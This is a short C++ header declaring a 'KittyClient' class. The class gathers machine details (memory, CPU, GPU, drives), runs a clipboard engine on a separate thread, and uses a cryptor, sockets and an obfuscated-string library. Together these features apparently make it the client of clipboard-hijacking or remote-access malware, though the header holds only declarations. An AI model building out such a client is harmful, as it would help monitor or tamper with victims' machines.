#pragma once

#include <adv/MetaString.h>
#include <kitty/system.h>
#include <iostream>
#include <unordered_map>
#include <windows.h>
#include <regex>
#include <nlohmann/json.hpp>
#include <nlohmann/json_fwd.hpp>
#include <kitty/socket.h>
#include <kitty/clipboard.h>
#include <kitty/cryptor.h>
#include <thread>

struct MachineInfo
{
	ULONGLONG totalMemory{};
	std::string cpuDeviceString{};
	DWORD logicalProcessorCount{};
	char gpuDeviceString[128]{};
	std::vector<std::string> drives{};
};

class KittyClient
{
public:
	MachineInfo info{};
	ClipboardEngine clipboardEngine = ClipboardEngine();
	std::thread clipboardThread{};
	Cryptor cryptor{ Cryptor() };

	KittyClient();
	~KittyClient();

	bool Register() const;
};